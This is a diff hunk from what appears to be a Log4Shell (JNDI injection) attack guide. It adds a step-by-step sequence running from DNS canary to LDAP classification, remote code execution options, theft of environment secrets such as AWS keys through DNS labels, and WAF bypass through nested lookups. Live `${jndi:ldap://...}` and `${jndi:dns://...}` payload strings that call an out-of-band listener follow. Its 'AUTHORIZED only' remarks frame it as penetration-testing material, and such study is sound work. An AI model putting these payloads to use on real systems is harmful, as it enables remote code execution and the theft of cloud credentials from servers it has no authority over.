@@ -10,6 +10,21 @@ Payloads, protocols, WAF-bypass obfuscation, and `${env}` exfil for the guide. *
 ## 0. The canary (fire this first, DNS-first)
 *What & when:* your very first payload on any Java target — a string whose only job is to make the server phone your listener. Fire the `dns://` variant first (stealthiest, survives egress filters); a ping back = confirmed. Everything below is only worth trying once a canary lands a callback.
 
+**The whole attack in one sequence** (worked end-to-end in Guide §13.5):
+```
+1. CANARY   dns:// per-input token into EVERY header/param/field → watch OOB          → §0 / §1
+2. CONFIRM  DNS hit from the TARGET's egress carrying your token  = live sink (Critical)
+3. CLASSIFY re-fire ldap://  →  LDAP connect-back?
+              YES → object-delivery egress open → RCE path (go to 4)
+              NO  → lookups fire but delivery closed (2.15-class / egress) → go to 5 (exfil)
+4. RCE      pick by JVM state: A remote-codebase (old JDK) · C BeanFactory/EL (modern+Tomcat)
+              · B serialized gadget (classpath) → AUTHORIZED only, one benign `id`, STOP    → §5
+5. EXFIL    ${env:AWS_SECRET_ACCESS_KEY} nested in the DNS host → secret leaves as a label
+              (works on "patched" 2.15!) → validate read-only off-target, STOP              → §3
+   BYPASS   raw ${jndi: blocked? → nested ${lower:}/${::-} rebuild the word                 → §2
+```
+
+
 ```
 ${jndi:ldap://TOKEN.OOB/a}                 # classic
 ${jndi:dns://TOKEN.OOB/a}                   # detection + exfil; survives egress filtering; stealthiest
